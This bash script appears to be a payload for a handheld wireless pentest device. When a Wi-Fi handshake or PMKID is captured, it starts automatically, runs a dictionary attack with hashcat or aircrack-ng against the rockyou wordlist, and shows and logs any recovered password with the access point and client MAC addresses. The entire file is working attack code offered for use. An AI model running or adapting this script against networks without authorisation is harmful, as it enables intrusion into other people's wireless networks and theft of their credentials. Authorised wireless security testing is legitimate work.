#!/bin/bash
# Title: Auto-Crack Handshake
# Description: Automatically attempt dictionary attack on captured handshakes
# Author: Red Team Toolkit
# Version: 1.0
# Category: alerts
# Net Mode: OFF
#
# LED States
# - Amber blink: Cracking in progress
# - Green: Password found
# - Red: Crack attempt failed/exhausted

set -euo pipefail

WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
CUSTOM_WORDLIST="${CUSTOM_WORDLIST:-}"
MAX_CRACK_TIME="${MAX_CRACK_TIME:-300}"
RESULTS_DIR="${RESULTS_DIR:-/tmp/auto-crack}"

have() { command -v "$1" >/dev/null 2>&1; }

mkdir -p "$RESULTS_DIR"

LOG blue "=== Auto-Crack Triggered ==="
LOG "$_ALERT_HANDSHAKE_SUMMARY"
LOG ""

if [[ "${_ALERT_HANDSHAKE_TYPE:-}" == "pmkid" ]]; then
  LOG "Type: PMKID"
elif [[ "${_ALERT_HANDSHAKE_COMPLETE:-}" == "true" ]]; then
  LOG green "Type: Complete EAPOL (4-way + beacon)"
else
  LOG "Type: Partial EAPOL"
fi

hashcat_file="${_ALERT_HANDSHAKE_HASHCAT_PATH:-}"
pcap_file="${_ALERT_HANDSHAKE_PCAP_PATH:-}"

if [[ -z "$hashcat_file" && -z "$pcap_file" ]]; then
  LOG red "No handshake file available"
  ALERT "No handshake file to crack"
  exit 1
fi

wordlist_to_use=""
if [[ -n "$CUSTOM_WORDLIST" && -f "$CUSTOM_WORDLIST" ]]; then
  wordlist_to_use="$CUSTOM_WORDLIST"
elif [[ -f "$WORDLIST" ]]; then
  wordlist_to_use="$WORDLIST"
else
  LOG red "No wordlist found"
  ALERT "Handshake captured - no wordlist available for cracking"
  exit 1
fi

LOG "Wordlist: $wordlist_to_use"
LOG "Max time: ${MAX_CRACK_TIME}s"
LOG ""

LED Y FAST
VIBRATE 200

result_file="$RESULTS_DIR/crack_$(date +%Y%m%d_%H%M%S).txt"

crack_success=0

if have hashcat && [[ -n "$hashcat_file" ]]; then
  LOG "Attempting hashcat..."
  
  hash_mode=""
  case "${_ALERT_HANDSHAKE_TYPE:-eapol}" in
    pmkid) hash_mode="22000" ;;
    *) hash_mode="22000" ;;
  esac
  
  if timeout "$MAX_CRACK_TIME" hashcat -m "$hash_mode" -a 0 \
    "$hashcat_file" "$wordlist_to_use" \
    --potfile-disable \
    -o "$result_file" 2>/dev/null; then
    
    if [[ -s "$result_file" ]]; then
      crack_success=1
    fi
  fi
  
elif have aircrack-ng && [[ -n "$pcap_file" ]]; then
  LOG "Attempting aircrack-ng..."
  
  bssid="${_ALERT_HANDSHAKE_AP_MAC_ADDRESS:-}"
  
  if [[ -n "$bssid" ]]; then
    if timeout "$MAX_CRACK_TIME" aircrack-ng \
      -b "$bssid" \
      -w "$wordlist_to_use" \
      -l "$result_file" \
      "$pcap_file" 2>/dev/null | grep -q "KEY FOUND"; then
      crack_success=1
    fi
  fi
else
  LOG red "No cracking tools available (hashcat or aircrack-ng)"
  ALERT "Handshake captured - install hashcat/aircrack-ng to crack"
  exit 1
fi

if [[ $crack_success -eq 1 && -s "$result_file" ]]; then
  LED G SOLID
  RINGTONE success 2>/dev/null || true
  VIBRATE 500
  
  password=$(cat "$result_file" | tail -1)
  
  LOG ""
  LOG green "!!! PASSWORD FOUND !!!"
  LOG "AP: ${_ALERT_HANDSHAKE_AP_MAC_ADDRESS:-unknown}"
  LOG "Password: $password"
  
  ALERT "PASSWORD CRACKED: $password"
  
  {
    echo "=== Cracked Handshake ==="
    echo "Time: $(date)"
    echo "AP BSSID: ${_ALERT_HANDSHAKE_AP_MAC_ADDRESS:-}"
    echo "Client: ${_ALERT_HANDSHAKE_CLIENT_MAC_ADDRESS:-}"
    echo "Type: ${_ALERT_HANDSHAKE_TYPE:-}"
    echo "Password: $password"
    echo "Source: ${pcap_file:-$hashcat_file}"
  } >> "$RESULTS_DIR/cracked_passwords.log"
else
  LED R DOUBLE
  VIBRATE 100
  
  LOG ""
  LOG red "Crack attempt exhausted"
  LOG "Handshake saved for offline cracking"
  
  ALERT "Handshake captured - password not in wordlist"
  
  {
    echo "[$(date)] UNCRACKED: AP=${_ALERT_HANDSHAKE_AP_MAC_ADDRESS:-} | File=${pcap_file:-$hashcat_file}"
  } >> "$RESULTS_DIR/pending_cracks.log"
fi

LED OFF
